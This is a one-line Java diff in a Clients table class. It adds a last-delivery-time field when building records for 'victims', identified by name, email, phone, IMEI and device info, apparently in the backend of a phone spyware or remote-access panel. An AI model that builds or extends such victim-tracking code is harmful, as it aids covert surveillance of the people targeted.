@@ -246,7 +246,7 @@ public class Clients extends BaseTable<Client> {
                     final String deviceInfoDynamic = rs.getString(Victims.COLUMN_DEVICE_INFO_DYNAMIC);
                     final String victimCode = rs.getString(Victims.COLUMN_VICTIM_CODE);
 
-                    victims.add(new Victim(id, name, email, phone, imei, null, null, null, deviceName, deviceInfoStatic, deviceInfoDynamic, null, null, false, victimCode));
+                    victims.add(new Victim(id, name, email, phone, imei, null, null, null, deviceName, deviceInfoStatic, deviceInfoDynamic, null, null, false, victimCode, relativeLastDeliveryTime));
 
                 } while (rs.next());
             }
